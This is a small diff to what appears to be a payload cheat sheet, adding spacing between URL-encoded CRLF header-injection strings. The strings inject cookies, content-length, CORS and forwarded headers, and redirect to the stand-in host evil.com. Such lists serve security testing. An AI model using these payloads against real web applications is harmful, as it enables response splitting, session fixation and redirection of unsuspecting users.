@@ -24,12 +24,19 @@ ________________________________________________________________________________
 
 
 %0d%0aSet-Cookie:crlf=1
+
 %0a%0dSet-Cookie:crlf=1
+
 %0d%0aX-Injection-Test:1
+
 %0d%0aContent-Length:0
+
 %0d%0aLocation:evil.com
+
 %0d%0aRefresh:0;url=http://evil.com
+
 %0d%0aAccess-Control-Allow-Origin:*
+
 %0d%0aX-Forwarded-For:evil.com
 ````
 _____________________________________________________________________________________________________________________________
